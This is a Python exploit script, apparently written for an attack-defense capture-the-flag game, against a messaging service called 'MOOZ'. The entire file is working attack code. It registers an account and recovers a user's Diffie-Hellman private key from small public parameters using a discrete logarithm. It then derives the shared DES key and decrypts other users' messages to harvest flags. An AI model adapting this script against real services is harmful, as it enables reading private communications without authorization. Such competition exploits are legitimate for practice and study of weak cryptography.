from typing import Iterable
from morel import logger
import requests
from sympy.ntheory.residue_ntheory import discrete_log as dlog
from Crypto.Cipher import DES
import json
import base64

s = requests.Session()

# {"user1": "qlewis@example.net", "user2": "trandall@example.org"}


def register(target_ip, username, password, email):
    print("hey")

    print(target_ip)

    res = s.post(
        f"https://{target_ip}/auth/register",
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:114.0) Gecko/20100101 Firefox/114.0",
            "Referer": "https://{target_ip}",
        },
        json={"email": email, "username": username, "password": password},
        verify=False,
    )

    print(res.text)


def login(target_ip, email, password):
    res = s.post(
        f"https://{target_ip}/auth/login",
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:114.0) Gecko/20100101 Firefox/114.0",
            "Referer": "https://{target_ip}",
        },
        json={"email": email, "password": password},
        verify=False,
    )

    print(res.text)


def get_targets(target_ip):
    res = s.get(f"http://10.10.0.1:8081/flagIds?service=MOOZ&team={target_ip}")
    targets = res.json()["MOOZ"][target_ip]

    target_dicts = []
    for target in targets:
        # print(target)
        target_dict = json.loads(target)
        # print(target_dict["user1"])
        target_dicts.append(target_dict)

    return targets


def get_users(target_ip):
    res = s.get(f"https://{target_ip}/auth/users", verify=False)
    users = res.json()["users"]

    return users


def get_user_id(users, user_email):
    for user in users:
        if user["email"] == user_email:
            return user["id"]
    return False


def get_public_params(target_ip: str):
    # G = 128
    # P = 3793

    print("getting params")
    res = s.get(f"https://{target_ip}/crypto/get_params", verify=False)
    params = res.json()["params"]
    g = int(params["g"])
    p = int(params["p"])

    return g, p


def get_public(target_ip, user_id):
    res = s.get(f"https://{target_ip}/crypto/get_public/{user_id}", verify=False)
    res = res.json()

    return int(res["public"])


def compute_private_key(p, g, public):
    print("p, g, public")
    print(p, g, public)

    private = dlog(p, public, g)

    return private


def get_messages(target_ip, sender_id, receiver_id):
    res = s.get(f"https://{target_ip}/messages/{sender_id}/{receiver_id}", verify=False)
    messages_enc = res.json()["data"]

    return messages_enc


def decrypt(ciphertext, symkey):
    selected_cipher = get_selected_cipher(symkey)
    raw_ciphertext = base64.b64decode(ciphertext)
    decrypted_message_with_padding = selected_cipher.decrypt(raw_ciphertext)
    return decrypted_message_with_padding.decode("utf-8").strip()


def get_selected_cipher(symkey):
    # trim key to 7 bytes
    if (len(bin(symkey)) - 2) > 56:
        symkey = symkey & 0xFFFFFFFFFFFFFF
    return DES.new(symkey.to_bytes(8, byteorder="little"), DES.MODE_ECB)


def main(target_ip: str) -> Iterable[str]:
    log = logger.bind(file=f"{__name__}.log")

    log.debug(f"{__name__} against {target_ip}")

    flags = []

    register(target_ip, "enzox", "enzox", "enzox@enzo.com")
    login(target_ip, "enzox@enzo.com", "enzox")

    G, P = get_public_params(target_ip)

    if G.bit_length() >= 20 or P.bit_length() >= 20:
        return []

    users = get_users(target_ip)

    targets = get_targets(target_ip)
    print(f"{targets = }")

    for target in targets:
        target_flags = []

        target = json.loads(target)
        # print(f"{target = }")

        sender = target["user1"]
        receiver = target["user2"]
        print(sender, receiver)
        sender_id = get_user_id(users, sender)
        receiver_id = get_user_id(users, receiver)

        sender_public_key = get_public(target_ip, sender_id)
        # sender_public_key = 1577
        receiver_public_key = get_public(target_ip, receiver_id)
        # receiver_public_key = 1311

        # sender_private_key = compute_private_key(P, G, sender_public_key)
        receiver_private_key = compute_private_key(P, G, receiver_public_key)

        symmetric_key = pow(sender_public_key, receiver_private_key, P)

        messages_enc = get_messages(target_ip, sender_id, receiver_id)

        log.debug(messages_enc)
        log.debug(messages_enc)

        target_flags = decrypt(messages_enc, symmetric_key)
        log.debug("DEC:", target_flags)

        flags += [target_flags]

    return flags


# flags = main("10.60.0.1")

# print(flags)
